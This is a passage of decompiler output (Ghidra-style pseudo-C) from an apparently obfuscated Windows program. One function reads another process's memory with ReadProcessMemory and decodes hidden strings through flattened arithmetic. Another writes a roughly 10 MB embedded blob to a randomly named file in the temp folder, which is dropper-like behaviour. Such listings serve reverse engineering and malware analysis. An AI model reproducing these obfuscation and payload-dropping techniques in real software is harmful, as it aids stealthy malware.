               ((uint)(byte)(('\b' - (bVar15 + 0xa8 & bVar2)) * '\x02' + bVar2 + bVar15) * 2);
LAB_140017332:
      *(byte *)((longlong)local_148 + (uVar11 - 0x50)) =
           ('2' - (bVar2 & bVar15 + 0x84)) * '\x02' + bVar2 + bVar15 + 0x84;
      uVar13 = uVar13 + 1;
    }
  }
  goto LAB_140016983;
}



/* ==================================================================== */
/* FUN_1400174f0 @ 1400174f0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_1400174f0(undefined8 *param_1,LPCVOID param_2)

{
  longlong *plVar1;
  byte bVar2;
  BOOL BVar3;
  ulonglong uVar4;
  char *pcVar5;
  longlong lVar6;
  byte bVar7;
  char cVar8;
  undefined4 *puVar9;
  ulonglong uVar10;
  ulonglong uVar11;
  char cVar12;
  ulonglong uVar13;
  longlong lVar14;
  longlong *plVar15;
  undefined1 auStackY_e8 [32];
  byte local_b8;
  byte bStack_a9;
  undefined4 local_a8;
  undefined4 local_a4;
  undefined2 local_a0;
  undefined8 local_9e;
  undefined4 local_96;
  undefined2 local_92;
  undefined8 *local_88;
  longlong *local_80;
  longlong *plStack_78;
  longlong *local_70;
  char local_68 [32];
  ulonglong local_48;
  undefined4 uStack_3f;

  local_48 = DAT_14005d040 ^ (ulonglong)auStackY_e8;
  lVar6 = 0;
  local_70 = (longlong *)0x0;
  local_80 = (longlong *)0x0;
  plStack_78 = (longlong *)0x0;
  local_88 = param_1;
  local_80 = (longlong *)FUN_14000e6b0(0x400);
  plVar1 = local_80 + 0x80;
  local_70 = plVar1;
  memset(local_80,0,0x400);
  plStack_78 = plVar1;
  BVar3 = ReadProcessMemory(*(HANDLE *)(*(longlong *)(*(longlong *)*param_1 + 0x58) + 0x30),param_2,
                            local_80,(longlong)plVar1 - (longlong)local_80 & 0xfffffffffffffff8,
                            (SIZE_T *)0x0);
  plVar1 = plStack_78;
  if (BVar3 == 0) {
LAB_14001817b:
    FUN_14000e300(&local_80);
  }
  else {
    if (local_80 != plStack_78) {
      plVar15 = local_80;
LAB_1400175b0:
      lVar6 = *plVar15;
      if (lVar6 != 0) {
        local_68[0] = '\0';
        local_68[1] = '\0';
        local_68[2] = '\0';
        local_68[3] = '\0';
        local_68[4] = '\0';
        local_68[5] = '\0';
        local_68[6] = '\0';
        local_68[7] = '\0';
        local_68[8] = '\0';
        local_68[9] = '\0';
        local_68[10] = '\0';
        local_68[0xb] = '\0';
        local_68[0xc] = '\0';
        local_68[0xd] = '\0';
        local_68[0xe] = '\0';
        local_68[0xf] = '\0';
        local_68[0x10] = '\0';
        local_68[0x11] = '\0';
        local_68[0x12] = '\0';
        local_68[0x13] = '\0';
        local_68[0x14] = '\0';
        local_68[0x15] = '\0';
        local_68[0x16] = '\0';
        local_68[0x17] = '\0';
        local_68[0x18] = '\0';
        local_68[0x19] = '\0';
        local_68[0x1a] = '\0';
        local_68[0x1b] = '\0';
        local_68[0x1c] = '\0';
        local_68[0x1d] = '\0';
        local_68[0x1e] = '\0';
        local_68[0x1f] = '\0';
        BVar3 = ReadProcessMemory(*(HANDLE *)(*(longlong *)(*(longlong *)*param_1 + 0x58) + 0x30),
                                  (LPCVOID)(lVar6 + 0x18),local_68,0x20,(SIZE_T *)0x0);
        if (BVar3 != 0) {
          local_9e = 0;
          local_96 = 0;
          local_92 = 0;
          local_a8 = 0x5d434e6e;
          local_a4 = 0x48434f5e;
          local_a0 = 0x2d5a;
LAB_140017630:
          uVar4 = DAT_140a618c8;
          uVar10 = DAT_140a618d0;
LAB_140017640:
          uVar13 = 0;
          uVar11 = uVar10;
LAB_140017643:
          if (0x17 < uVar13) {
            puVar9 = &local_a8;
LAB_140018115:
            pcVar5 = local_68;
            lVar14 = (longlong)puVar9 - (longlong)pcVar5;
            goto LAB_140018120;
          }
          bVar2 = local_68[uVar13 - 0x40];
LAB_140017653:
          if (uVar13 < uVar4) {
            puVar9 = (undefined4 *)(auStackY_e8 + 0x11b0d41);
            goto LAB_140018115;
          }
          cVar12 = (char)uVar13;
          if (uVar11 + 1 <= uVar4) {
            if (uVar4 != uVar11 + 1) {
              if (uVar4 != uVar11 + 2) {
                if (uVar4 == uVar11 + 3) {
                  local_b8 = (cVar12 + 0x4dU + bVar2 + (bVar2 & cVar12 + 0x4dU) * -2) - 0x1b;
                  goto LAB_140018008;
                }
                if (uVar4 == uVar11 + 6) {
                  local_b8 = bVar2 + (bVar2 & cVar12 - 0x1fU) * -2 + -0x27 + (cVar12 - 0x1fU);
                  goto LAB_140017fcf;
                }
                if (uVar4 != uVar11 + 2) goto LAB_1400176b6;
                cVar8 = cVar12 + (cVar12 + 0xbfU & bVar2) * -2 + -0x7a;
                goto LAB_140017f8a;
              }
              local_b8 = bVar2 + (bVar2 & cVar12 + 3U) * -2 + -0x15 + cVar12 + 3U;
              goto LAB_140018039;
            }
            local_b8 = (bVar2 + cVar12 + 0x6fU + (cVar12 + 0x6fU & bVar2) * -2) - 9;
            uVar13 = uVar13 + (byte)local_68[uVar13 - 0x40] + uVar11 + 1;
            goto LAB_140017643;
          }
          local_b8 = ('\x11' - (cVar12 + 0x25U & bVar2)) * '\x02' + bVar2 + cVar12;
LAB_1400176b6:
          if (uVar13 < uVar11) {
            puVar9 = (undefined4 *)(auStackY_e8 + 0x159c91c);
            goto LAB_140018115;
          }
          if (uVar4 < uVar11 + 0x61) {
            local_b8 = bVar2 + (cVar12 + 9U & bVar2) * -2 + -0x36 + cVar12;
          }
          else {
            if (uVar4 == uVar11 + 1) {
              cVar8 = ('\a' - (cVar12 + 0x53U & bVar2)) * '\x02' + cVar12;
              goto LAB_140017f8a;
            }
            if (uVar4 == uVar11 + 3) {
              local_b8 = cVar12 + (cVar12 - 0x19U & bVar2) * -2 + -0x6a + bVar2;
              goto LAB_140017643;
            }
            if (uVar4 == uVar11 + 2) {
              local_b8 = ('\x0f' - (cVar12 + 0x7bU & bVar2)) * '\x02' + cVar12 + bVar2;
              uVar4 = uVar4 + uVar11;
              goto LAB_140018008;
            }
            if (uVar4 == uVar11 + 5) {
              local_b8 = ('1' - (cVar12 - 0x3bU & bVar2)) * '\x02' + cVar12 + bVar2;
              goto LAB_140018008;
            }
            if (uVar4 == uVar11 + 6) {
              local_b8 = cVar12 + (cVar12 + 0xfU & bVar2) * -2 + -0x5a + bVar2;
              goto LAB_140018039;
            }
          }
          while (uVar10 = uVar11, uVar13 < uVar11 + uVar4) {
            while( true ) {
              do {
                uVar11 = uVar10;
                if (uVar4 == uVar11 + 5) {
                  cVar8 = cVar12 + (cVar12 - 0x1aU & bVar2) * -2 + -100;
                  goto LAB_140017f8a;
                }
                if (uVar4 == uVar11 + 0x200) {
                  uVar11 = uVar11 + 1;
                  local_b8 = cVar12 + (cVar12 + 0x30U & bVar2) * -2 + -0x20 + bVar2;
                  goto LAB_140017643;
                }
                if (uVar4 == uVar11 + 4) {
                  local_b8 = ('\x12' - (cVar12 + 0x7aU & bVar2)) * '\x02' + cVar12 + bVar2;
                  goto LAB_140017643;
                }
                if (uVar4 == uVar11 + 0x80) {
                  local_b8 = ('4' - (cVar12 - 0x3cU & bVar2)) * '\x02' + cVar12 + bVar2;
                  goto LAB_140017fcf;
                }
                if (uVar4 == uVar11 + 3) {
                  local_b8 = cVar12 + (cVar12 + 0xeU & bVar2) * -2 + -0x54 + bVar2;
                  uVar4 = uVar4 + uVar11;
                  goto LAB_140018008;
                }
                if (uVar4 == uVar11 + 100) {
                  local_b8 = cVar12 + (cVar12 + 0x58U & bVar2) * -2 + -0x10 + bVar2;
                  goto LAB_140018008;
                }
                if (uVar4 == uVar11 + 2) {
                  local_b8 = ('\x1a' - (cVar12 + 0xa2U & bVar2)) * '\x02' + cVar12 + bVar2;
                  goto LAB_140018039;
                }
                if (uVar4 == uVar11 + 0x42) {
                  local_b8 = ('<' - (cVar12 - 0x14U & bVar2)) * '\x02' + cVar12 + bVar2;
                  goto LAB_140018063;
                }
                if (uVar4 == uVar11 + 1) {
                  local_b8 = cVar12 + (cVar12 + 0x36U & bVar2) * -2 + -0x44 + bVar2;
                  uVar13 = uVar13 + (byte)local_68[uVar13 - 0x40] + uVar11 + 1;
                  goto LAB_140017643;
                }
                uVar10 = uVar11;
              } while (uVar4 == uVar11 + 0x40);
              uVar4 = uVar11 + 0x400;
              uVar10 = uVar11 + 0x42a;
              if (uVar4 < uVar11 + 0x430) {
                local_b8 = ('3' - (cVar12 - 0x11U & bVar2)) * '\x02' + cVar12 + bVar2;
                goto LAB_140017630;
              }
              if (uVar4 < uVar11 + 0x812) {
                local_b8 = bVar2 + cVar12 + (cVar12 + 0x39U & bVar2) * -2 + 0xaa;
                goto LAB_140017640;
              }
              if (uVar4 < uVar11 + 0x42f) {
                local_b8 = cVar12 + (cVar12 + 0x83U & bVar2) * -2 + -0x12 + bVar2;
                uVar11 = uVar10;
                goto LAB_140017653;
              }
              if (uVar4 < uVar11 + 0x62a) {
                local_b8 = ('\x19' - (cVar12 - 0x33U & bVar2)) * '\x02' + cVar12 + bVar2;
                uVar11 = uVar10;
                goto LAB_1400176b6;
              }
              if (uVar4 < uVar11 + 0x42e) break;
              if (uVar4 < uVar11 + 0x4aa) {
                cVar8 = cVar12 + (cVar12 + 0x61U & bVar2) * -2 + -0x46;
                uVar11 = uVar10;
                goto LAB_140017b03;
              }
              if (uVar4 < uVar11 + 0x42d) {
                cVar8 = cVar12 + (cVar12 + 0xabU & bVar2) * -2 + -2;
                uVar11 = uVar10;
                goto LAB_140017ac3;
              }
              if (uVar4 < uVar11 + 0x48e) {
                cVar8 = ('!' - (cVar12 - 0xbU & bVar2)) * '\x02' + cVar12;
                uVar11 = uVar10;
                goto LAB_140017a8a;
              }
              if (uVar4 < uVar11 + 0x42c) {
                local_b8 = cVar12 + (cVar12 + 0x3fU & bVar2) * -2 + -0x7a + bVar2;
                uVar11 = uVar10;
                goto LAB_140017a69;
              }
              if (uVar11 + 0x46c <= uVar4) {
                uVar4 = uVar11 + 0x142a;
                uVar10 = uVar11 + 0x142b;
                if (uVar11 + 0x1433 < uVar4) {
                  local_b8 = ('\x18' - (cVar12 - 8U & bVar2)) * '\x02' + cVar12 + bVar2;
                  uVar13 = uVar13 + (byte)local_68[uVar13 - 0x40] + uVar10 + 1;
                  uVar11 = uVar10;
                  goto LAB_140017643;
                }
                if (uVar11 + 0x182b < uVar4) {
                  local_b8 = (':' - (cVar12 + 0x42U & bVar2)) * '\x02' + cVar12 + bVar2;
                  uVar11 = uVar10;
                  goto LAB_140018063;
                }
                if (uVar11 + 0x1431 < uVar4) {
                  local_b8 = cVar12 + (cVar12 + 0x8cU & bVar2) * -2 + -0x48 + bVar2;
                  uVar11 = uVar10;
                  goto LAB_140018039;
                }
                if (uVar11 + 0x1813 < uVar4) {
                  local_b8 = cVar12 + (cVar12 - 0x2aU & bVar2) * -2 + -4 + bVar2;
                  uVar11 = uVar10;
                  goto LAB_140018008;
                }
                if (uVar11 + 0x1430 < uVar4) {
                  local_b8 = (' ' - (cVar12 + 0x20U & bVar2)) * '\x02' + cVar12 + bVar2;
                  uVar4 = uVar4 + uVar10;
                  uVar11 = uVar10;
                  goto LAB_140018008;
                }
                if (uVar11 + 0x162b < uVar4) {
                  local_b8 = cVar12 + (cVar12 + 0x6aU & bVar2) * -2 + -0x7c + bVar2;
                  uVar11 = uVar10;
                  goto LAB_140017fcf;
                }
                if (uVar11 + 0x142f < uVar4) {
                  local_b8 = cVar12 + (cVar12 + 0xb4U & bVar2) * -2 + -0x38 + bVar2;
                  uVar11 = uVar10;
                  goto LAB_140017643;
                }
                if (uVar11 + 0x14ab < uVar4) {
                  local_b8 = ('\x06' - (cVar12 - 2U & bVar2)) * '\x02' + cVar12 + bVar2;
                  uVar11 = uVar11 + 0x142c;
                  goto LAB_140017643;
                }
                if (uVar11 + 0x142e < uVar4) {
                  cVar8 = ('(' - (cVar12 + 0x48U & bVar2)) * '\x02' + cVar12;
                  uVar11 = uVar10;
                  goto LAB_140017f8a;
                }
                if (uVar4 <= uVar11 + 0x148f) {
                  uVar4 = uVar11 + 0x148c;
                  uVar10 = uVar11 + 0x148e;
                }
              }
            }
            local_b8 = (';' - (cVar12 + 0x17U & bVar2)) * '\x02' + cVar12 + bVar2;
            uVar11 = uVar10;
          }
          if (uVar4 < uVar11 + 0x80) {
            cVar8 = ('\x11' - (cVar12 + 0x25U & bVar2)) * '\x02' + cVar12;
LAB_140017b03:
            local_b8 = cVar8 + bVar2;
LAB_140017b06:
            if (uVar11 + uVar4 != 5) {
              if (uVar11 + 0x20 < uVar4) {
                cVar8 = ('\r' - (cVar12 - 0x2fU & bVar2)) * '\x02' + cVar12;
LAB_140017ac3:
                local_b8 = cVar8 + bVar2;
LAB_140017ac6:
                if (5 < uVar4) {
                  local_b8 = bVar2 * '\x02' + (cVar12 + 8U & bVar2) * -2 + -0x30 + cVar12;
LAB_140017fcf:
                  local_68[uVar13 - 0x40] =
                       bVar2 + (bVar2 & cVar12 + 0x2dU) * -2 + -0x3b + cVar12 + 0x2dU + local_b8;
                  uVar4 = uVar4 + uVar11;
LAB_140018008:
                  uVar13 = uVar13 - local_b8;
                  goto LAB_140017643;
                }
                if (uVar11 + 0x28 < uVar4) {
                  cVar8 = cVar12 + (cVar12 - 0x26U & bVar2) * -2 + -0x1c;
LAB_140017a8a:
                  local_b8 = cVar8 + bVar2;
                }
                else {
                  if (uVar4 == uVar11 + 1) {
                    local_b8 = ('\x14' - (cVar12 + 0x24U & bVar2)) * '\x02' + cVar12 + bVar2;
                    uVar13 = uVar13 + (byte)local_68[uVar13 - 0x40] + uVar11 + 1;
                    goto LAB_140017643;
                  }
                  if (uVar4 == uVar11 + 3) {
                    local_b8 = cVar12 + (cVar12 + 0xb8U & bVar2) * -2 + -0x50 + bVar2;
                    goto LAB_140018039;
                  }
                  if (uVar4 == uVar11 + 5) {
                    local_b8 = ('>' - (cVar12 + 0x96U & bVar2)) * '\x02' + cVar12 + bVar2;
                    goto LAB_140017fcf;
                  }
                  if (uVar4 == uVar11 + 7) {
                    local_b8 = cVar12 + (cVar12 - 0x20U & bVar2) * -2 + -0x40 + bVar2;
                    goto LAB_140017643;
                  }
                  if (uVar4 == uVar11 + 2) {
                    uVar11 = uVar11 + 1;
                    local_b8 = ('\x02' - (cVar12 + 0x2aU & bVar2)) * '\x02' + cVar12 + bVar2;
                    goto LAB_140017643;
                  }
                }
                if (uVar11 < 8) {
LAB_140017a69:
                  local_68[uVar13 - 0x40] = local_b8;
                  uVar13 = uVar13 + 1;
                  goto LAB_140017643;
                }
                local_b8 = (('\x06' - (cVar12 + 0xbeU & bVar2)) * '\x02' + cVar12 + bVar2) * '\x02';
              }
              else {
                if (uVar4 != uVar11 + 1) {
                  if (uVar4 == uVar11 + 3) {
                    local_b8 = cVar12 + (cVar12 + 0xafU & bVar2) * -2 + -0x1a + bVar2;
                  }
                  else {
                    if (uVar4 == uVar11 + 4) {
                      local_b8 = cVar12 + (cVar12 + 0x8dU & bVar2) * -2 + -0x4e + bVar2;
                      goto LAB_140018008;
                    }
                    if (uVar4 == uVar11 + 2) {
                      local_b8 = cVar12 + (cVar12 - 0x29U & bVar2) * -2 + -10 + bVar2;
                      goto LAB_140018039;
                    }
                    if (uVar4 != uVar11 + 8) goto LAB_140017ac6;
                    local_b8 = ('?' - (cVar12 + 0x6bU & bVar2)) * '\x02' + cVar12 + bVar2;
                    uVar13 = uVar13 + (byte)local_68[uVar13 - 0x40] + uVar11 + 1;
                  }
                  goto LAB_140017643;
                }
                cVar8 = ('/' - (cVar12 + 0x1bU & bVar2)) * '\x02' + cVar12;
LAB_140017f8a:
                local_b8 = cVar8 + bVar2;
              }
              local_68[uVar13 - 0x40] =
                   bVar2 + (bVar2 & cVar12 - 0x1dU) * -2 + -0x35 + (cVar12 - 0x1dU);
              uVar11 = uVar11 + 1;
              goto LAB_140017643;
            }
            local_b8 = ('\n' - (cVar12 + 0x52U & bVar2)) * '\x02' + cVar12;
          }
          else {
            if (uVar4 == uVar11 + 1) {
              local_b8 = cVar12 + (cVar12 + 0x12U & bVar2) * -2 + -0x6c + bVar2;
              uVar13 = uVar13 + (byte)local_68[uVar13 - 0x40] + uVar11 + 1;
              goto LAB_140017643;
            }
            if (uVar4 != uVar11 + 2) {
              if (uVar4 == uVar11 + 3) {
                local_b8 = cVar12 + (cVar12 + 0x84U & bVar2) * -2 + -0x18 + bVar2;
                goto LAB_140017fcf;
              }
              if (uVar4 != uVar11 + 7) goto LAB_140017b06;
              uVar11 = uVar11 + 1;
              local_b8 = ('8' - (cVar12 + 0x18U & bVar2)) * '\x02' + cVar12 + bVar2;
              goto LAB_140017643;
            }
            local_b8 = ('\x0e' - (cVar12 + 0xa6U & bVar2)) * '\x02' + cVar12 + bVar2;
          }
LAB_140018039:
          bVar7 = bVar2 + (bVar2 & cVar12 + 0x77U) * -2 + -0x41 + cVar12 + 0x77U;
          local_68[uVar13 - 0x40] = bVar7;
          uVar13 = uVar13 - ((ulonglong)bVar7 + uVar11 + 1);
          uVar11 = uVar11 + 1;
LAB_140018063:
          bVar7 = (char)uVar13 + 0x9c;
          uVar4 = uVar4 + 1;
          local_68[uVar13 - 0x40] = bVar2 + (bVar2 & bVar7) * -2 + -0x44 + bVar7;
          lVar14 = uVar13 + (-1 - uVar4);
          uVar13 = lVar14 + (byte)local_68[lVar14 + -0x40] + uVar11 + 1;
          goto LAB_140017643;
        }
      }
      goto LAB_14001813b;
    }
LAB_140018148:
    lVar6 = FUN_14000e300(&local_80);
  }
  return lVar6;
  while (pcVar5 = pcVar5 + 1, cVar8 != '\0') {
LAB_140018120:
    cVar12 = *pcVar5;
    cVar8 = pcVar5[lVar14];
    if (cVar12 != cVar8) break;
  }
  if (cVar12 == cVar8) goto LAB_14001817b;
  param_1 = local_88;
LAB_14001813b:
  plVar15 = plVar15 + 1;
  if (plVar15 == plVar1) goto LAB_140018148;
  goto LAB_1400175b0;
}



/* ==================================================================== */
/* FUN_140018190 @ 140018190 */

/* WARNING: Function: __chkstk replaced with injection: alloca_probe */
/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 FUN_140018190(undefined8 param_1)

{
  ulonglong uVar1;
  byte bVar2;
  bool bVar3;
  DWORD DVar4;
  int iVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  basic_ostream<char,struct_std::char_traits<char>_> *this;
  undefined8 uVar8;
  byte bVar9;
  undefined4 *puVar10;
  ulonglong uVar11;
  ulonglong uVar12;
  byte bVar13;
  char cVar14;
  char cVar15;
  ulonglong uVar16;
  longlong lVar17;
  undefined1 auStack_1788 [32];
  undefined4 local_1768;
  byte local_1758;
  byte bStack_1749;
  undefined4 local_1748;
  undefined1 local_1744;
  undefined1 uStack_1743;
  undefined1 uStack_1742;
  undefined6 uStack_1741;
  undefined2 uStack_173b;
  undefined4 uStack_1739;
  undefined1 uStack_1735;
  undefined1 uStack_1734;
  undefined2 local_1733;
  undefined1 local_1720 [40];
  longlong local_16f8 [21];
  basic_ios<char,std::char_traits<char>_> local_1650 [104];
  undefined8 local_15e8;
  undefined1 local_15e0 [40];
  basic_ostream<char,std::char_traits<char>_> local_15b8 [8];
  undefined1 local_15b0 [128];
  basic_ios<char,std::char_traits<char>_> local_1530 [104];
  undefined1 local_14c8 [5008];
  CHAR local_138 [272];
  ulonglong local_28;
  undefined8 local_20;

  local_20 = 0x1400181b6;
  local_28 = DAT_14005d040 ^ (ulonglong)auStack_1788;
  local_15e8 = param_1;
  memset(local_138,0,0x104);
  DVar4 = GetTempPathA(0x104,local_138);
  if (DVar4 == 0) {
    FUN_140024d90(param_1);
    FUN_140025340(param_1);
    return param_1;
  }
  std::_Random_device();
  FUN_140023090(local_14c8);
  local_15e8 = 0xf00000000;
  memset(local_15b8,0,0xe8);
  FUN_140024480(local_15b8,1);
  local_1748 = 0x929b969d;
  local_1744 = 0x9d;
  uStack_1743 = 0x9c;
  uStack_1742 = 0x3c;
  uStack_1741 = 0;
  uStack_173b = 0;
  uStack_1739 = 0;
  uStack_1735 = 0;
  bVar13 = local_1758;
LAB_1400182a3:
  uVar6 = DAT_140a618c8;
  uVar11 = DAT_140a618d0;
LAB_1400182b0:
  uVar16 = 0;
  uVar7 = uVar6;
  uVar12 = uVar11;
LAB_1400182b3:
  if (0x13 < uVar16) {
    puVar10 = &local_1748;
LAB_140018d5e:
    FUN_140022e50(local_15b8,puVar10);
    lVar17 = 0x10;
    do {
      this = std::basic_ostream<char,std::char_traits<char>_>::operator<<
                       (local_15b8,(_func_ios_base_ptr_ios_base_ptr *)&LAB_14000f0f0);
      iVar5 = FUN_1400255c0(&local_15e8,local_14c8,local_15e8 & 0xffffffff,local_15e8._4_4_);
      std::basic_ostream<char,std::char_traits<char>_>::operator<<
                ((basic_ostream<char,std::char_traits<char>_> *)this,iVar5);
      lVar17 = lVar17 + -1;
    } while (lVar17 != 0);
    local_1748 = 0xf151654;
    local_1744 = 0xaa;
    uStack_1743 = 0;
    uStack_1742 = 0;
    uStack_1741 = 0;
    uStack_173b = 0;
    uStack_1739 = 0;
    uStack_1735 = 0;
    uStack_1734 = 0;
    local_1733 = 0;
    bVar13 = local_1758;
LAB_140018df3:
    uVar11 = DAT_140a618c8;
    uVar6 = DAT_140a618d0;
LAB_140018e00:
    uVar12 = 0;
    uVar7 = uVar6;
LAB_140018e03:
    if (0x16 < uVar12) {
      puVar10 = &local_1748;
LAB_140019801:
      FUN_140022e50(local_15b8,puVar10);
      FUN_140025510(local_15b0,&local_1748);
      uVar8 = FUN_140023550(local_1720,local_138);
      FUN_1400251a0(local_15e0,local_1758,uVar8,&local_1748);
      FUN_140025000(local_1720);
      FUN_140025000(&local_1748);
      memset(local_16f8,0,0x108);
      local_1768 = 1;
      FUN_140023710(local_16f8,local_15e0,0x30,0x40);
      bVar3 = std::ios_base::operator!
                        ((ios_base *)((longlong)local_16f8 + (longlong)*(int *)(local_16f8[0] + 4)))
      ;
      if (bVar3) {
        FUN_140024d90(param_1,local_1758);
        FUN_140025340(param_1);
      }
      else {
        std::basic_ostream<char,std::char_traits<char>_>::write
                  ((basic_ostream<char,std::char_traits<char>_> *)local_16f8,&DAT_14005d0c0,0x9f1400
                  );
        FUN_140023670(local_16f8);
        FUN_140023520(param_1,local_15e0);
      }
      FUN_1400236b0(local_1650);
      std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>
                (local_1650);
      FUN_140025000(local_15e0);
      FUN_140024420(local_1530);
      std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>
                (local_1530);
      return param_1;
    }
    bVar2 = local_1720[uVar12 - 0x28];
LAB_140018e13:
    if (uVar12 < uVar11) {
      puVar10 = (undefined4 *)(auStack_1788 + 0xc6fa61);
      goto LAB_140019801;
    }
    cVar15 = (char)uVar12;
    if (uVar7 + 1 <= uVar11) {
      if (uVar11 != uVar7 + 1) {
        if (uVar11 == uVar7 + 2) {
          bVar13 = bVar2 + cVar15 + 99U + (cVar15 + 99U & bVar2) * -2 + 0x4b;
          goto LAB_14001972b;
        }
        if (uVar11 != uVar7 + 3) goto LAB_140018e60;
        bVar13 = bVar2 + (cVar15 - 0x13U) + (cVar15 - 0x13U & bVar2) * -2 + 0x85;
        goto LAB_1400196fd;
      }
      bVar13 = (bVar2 + cVar15 + 0x4fU + (cVar15 + 0x4fU & bVar2) * -2) - 0x29;
      uVar12 = uVar12 + (byte)local_1720[uVar12 - 0x28] + uVar7 + 1;
      goto LAB_140018e03;
    }
    bVar13 = bVar2 + (bVar2 & cVar15 - 0x3bU) * -2 + -99 + (cVar15 - 0x3bU);
LAB_140018e60:
    if (uVar12 < uVar7) {
      puVar10 = (undefined4 *)(auStack_1788 + 0x159109c);
      goto LAB_140019801;
    }
    if (uVar7 + 4 <= uVar11) {
      if (uVar11 == uVar7 + 1) {
        cVar14 = cVar15 + (cVar15 + 0xb3U & bVar2) * -2 + -0x32;
        goto LAB_1400196c0;
      }
      if (uVar11 != uVar7 + 4) {
        if (uVar11 != uVar7 + 2) goto LAB_140018eb0;
        bVar13 = cVar15 + (cVar15 + 3U & bVar2) * -2 + -0x12 + bVar2;
        uVar12 = uVar12 + (byte)local_1720[uVar12 - 0x28] + uVar7 + 1;
        goto LAB_140018e03;
      }
      bVar13 = cVar15 + (cVar15 + 0x65U & bVar2) * -2 + -0x5e + bVar2;
      goto LAB_1400196fd;
    }
    bVar13 = ('\x05' - (cVar15 + 0x29U & bVar2)) * '\x02' + cVar15 + bVar2;
LAB_140018eb0:
    while (uVar6 = uVar7, uVar12 < uVar7 + uVar11) {
      while( true ) {
        do {
          uVar7 = uVar6;
          if (uVar11 == uVar7 + 0x1000) {
            cVar14 = ('\x0e' - (cVar15 + 0xa6U & bVar2)) * '\x02' + cVar15;
            goto LAB_1400196c0;
          }
          if (uVar11 == uVar7 + 0x10) {
            bVar13 = cVar15 + (cVar15 + 0x30U & bVar2) * -2 + -0x20 + bVar2;
            uVar7 = uVar7 + 1;
            goto LAB_140018e03;
          }
          if (uVar11 == uVar7 + 0x80) {
            bVar13 = cVar15 + (cVar15 + 0xbaU & bVar2) * -2 + -0x5c + bVar2;
            goto LAB_140018e03;
          }
          if (uVar11 == uVar7 + 0x7a) {
            cVar14 = ('4' - (cVar15 + 0x44U & bVar2)) * '\x02';
            goto LAB_14001962b;
          }
          if (uVar11 == uVar7 + 3) {
            bVar13 = ('\x16' - (cVar15 - 0x32U & bVar2)) * '\x02' + cVar15 + bVar2;
            uVar11 = uVar11 + uVar7;
            goto LAB_1400196fd;
          }
          if (uVar11 == uVar7 + 1000) {
            bVar13 = cVar15 + (cVar15 + 0x58U & bVar2) * -2 + -0x10 + bVar2;
            goto LAB_1400196fd;
          }
          if (uVar11 == uVar7 + 0x5a) {
            bVar13 = cVar15 + (cVar15 - 0x1eU & bVar2) * -2 + -0x4c + bVar2;
            goto LAB_14001972b;
          }
          if (uVar11 == uVar7 + 5) {
            bVar13 = ('<' - (cVar15 + 0x6cU & bVar2)) * '\x02' + cVar15 + bVar2;
            goto LAB_14001974e;
          }
          if (uVar11 == uVar7 + 0x20) {
            bVar13 = ('\x1e' - (cVar15 - 10U & bVar2)) * '\x02' + cVar15 + bVar2;
            uVar12 = uVar12 + (byte)local_1720[uVar12 - 0x28] + uVar7 + 1;
            goto LAB_140018e03;
          }
          uVar6 = uVar7;
        } while (uVar11 == uVar7 + 1);
        uVar11 = uVar7 + 4;
        uVar6 = uVar7 + 0xc;
        uVar16 = uVar7 + 0x1c;
        if (uVar11 < uVar16) {
          bVar13 = ('\x13' - (cVar15 - 0x31U & bVar2)) * '\x02' + cVar15 + bVar2;
          goto LAB_140018df3;
        }
        if (uVar11 < uVar7 + 0x8c) {
          bVar13 = (bVar2 + cVar15 + (cVar15 + 0x59U & bVar2) * -2) - 0x16;
          goto LAB_140018e00;
        }
        if (uVar11 < uVar7 + 0x12) {
          bVar13 = cVar15 + (cVar15 - 0x1dU & bVar2) * -2 + -0x52 + bVar2;
          uVar7 = uVar6;
          goto LAB_140018e13;
        }
        if (uVar11 < uVar7 + 0x34) {
          bVar13 = ('9' - (cVar15 + 0x6dU & bVar2)) * '\x02' + cVar15 + bVar2;
          uVar7 = uVar6;
          goto LAB_140018e60;
        }
        if (uVar11 < uVar7 + 0x3f4) break;
        if (uVar11 < uVar7 + 0x66) {
          cVar14 = cVar15 + (cVar15 + 0x81U & bVar2) * -2 + -6;
          uVar7 = uVar6;
          goto LAB_14001928e;
        }
        if (uVar11 < uVar7 + 0x4e) {
          cVar14 = cVar15 + (cVar15 + 0xbU & bVar2) * -2 + -0x42;
          uVar7 = uVar6;
          goto LAB_14001924b;
        }
        if (uVar11 < uVar7 + 0x100c) {
          cVar14 = cVar15 + (cVar15 + 0x95U & bVar2) * -2 + -0x7e;
          uVar7 = uVar6;
          goto LAB_140019212;
        }
        if (uVar11 < uVar7 + 0xd) {
          bVar13 = ('#' - (cVar15 + 0x1fU & bVar2)) * '\x02' + cVar15 + bVar2;
          uVar7 = uVar6;
          goto LAB_1400191f2;
        }
        if (uVar7 + 0x14 <= uVar11) {
          uVar6 = uVar7 + 0x96;
          uVar11 = uVar16;
          if (uVar7 + 0xc0 < uVar16) {
            bVar13 = ('\x18' - (cVar15 - 8U & bVar2)) * '\x02' + cVar15 + bVar2;
            uVar12 = uVar12 + (byte)local_1720[uVar12 - 0x28] + uVar6 + 1;
            uVar7 = uVar6;
            goto LAB_140018e03;
          }
          if (uVar7 + 0x9c < uVar16) {
            bVar13 = cVar15 + (cVar15 + 0x82U & bVar2) * -2 + -0xc + bVar2;
            uVar7 = uVar6;
            goto LAB_14001974e;
          }
          if (uVar7 + 0xbe < uVar16) {
            bVar13 = cVar15 + (cVar15 + 0xcU & bVar2) * -2 + -0x48 + bVar2;
            uVar7 = uVar6;
            goto LAB_14001972b;
          }
          if (uVar7 + 0x47e < uVar16) {
            bVar13 = ('>' - (cVar15 + 0x96U & bVar2)) * '\x02' + cVar15 + bVar2;
            uVar7 = uVar6;
            goto LAB_1400196fd;
          }
          if (uVar7 + 0x9f < uVar16) {
            bVar13 = (' ' - (cVar15 + 0x20U & bVar2)) * '\x02' + cVar15 + bVar2;
            uVar11 = uVar16 + uVar6;
            uVar7 = uVar6;
            goto LAB_1400196fd;
          }
          if (uVar7 + 0xd8 < uVar16) {
            cVar14 = ('\x02' - (cVar15 + 0xaaU & bVar2)) * '\x02';
            uVar7 = uVar6;
            goto LAB_14001962b;
          }
          if (uVar7 + 0x1096 < uVar16) {
            bVar13 = cVar15 + (cVar15 + 0x34U & bVar2) * -2 + -0x38 + bVar2;
            uVar7 = uVar6;
            goto LAB_140018e03;
          }
